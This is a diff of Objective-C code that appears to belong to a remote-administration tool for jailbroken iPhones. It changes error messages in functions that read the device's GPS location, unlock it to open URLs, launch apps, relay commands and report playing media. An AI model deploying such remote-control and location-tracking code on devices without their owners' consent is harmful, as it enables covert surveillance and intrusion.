@@ -44,10 +44,10 @@
     CLLocationCoordinate2D coordinate = [location coordinate];
     NSString *result = [NSString stringWithFormat:@"Latitude: %f\nLongitude: %f\nhttp://maps.google.com/maps?q=%f,%f", coordinate.latitude, coordinate.longitude, coordinate.latitude, coordinate.longitude];
     if ((int)(coordinate.latitude + coordinate.longitude) == 0) {
-        result = @"Failed to get coordinates!";
+        result = @"error";
     }
     [manager release];
-    printf("%s\n", [result cStringUsingEncoding:NSUTF8StringEncoding]);
+    printf("%s", [result cStringUsingEncoding:NSUTF8StringEncoding]);
 }
 
 -(void)getvol {
@@ -60,11 +60,11 @@
 -(void)openurl:(NSString *)url {
     if (![url isEqualToString:@""]) {
         CFURLRef cu = CFURLCreateWithBytes(NULL, (UInt8*)[url UTF8String], strlen([url UTF8String]), kCFStringEncodingUTF8, NULL);
-        if (!cu) printf("Invalid URL!\n");
+        if (!cu) printf("error");
         else {
             bool ret = SBSOpenSensitiveURLAndUnlock(cu, 1);
             if (!ret) {
-                printf("Failed to open URL!\n");
+                printf("error");
             }
         }
     }
@@ -75,7 +75,7 @@
     assert(identifier != NULL);
     int ret = SBSLaunchApplicationWithIdentifier(identifier, FALSE);
     if (ret != 0) {
-        printf("Failed to open application!\n");
+        printf("error");
     }
     CFRelease(identifier);
 }
@@ -102,7 +102,7 @@
 -(void)send_command:(NSString *)command {
     NSDictionary *userInfo = [NSDictionary dictionaryWithObject:command forKey:@"cmd"];
     if ([_messagingCenter sendMessageName:@"commandWithNoReply" userInfo:userInfo] == false) {
-        printf("You do not have ac1d installed!\n");
+        printf("error");
     }
 }
 
@@ -134,7 +134,7 @@
             NSString *result = [NSString stringWithFormat:@"Currently Playing\nTitle: %@\nAlbum: %@\nArtist: %@\nPlayback time: %f\n", title, album, artist, time2];
             printf("%s", [result cStringUsingEncoding:NSUTF8StringEncoding]);
         } else {
-            printf("Not playing!\n");
+            printf("error");
         }
     }
 }
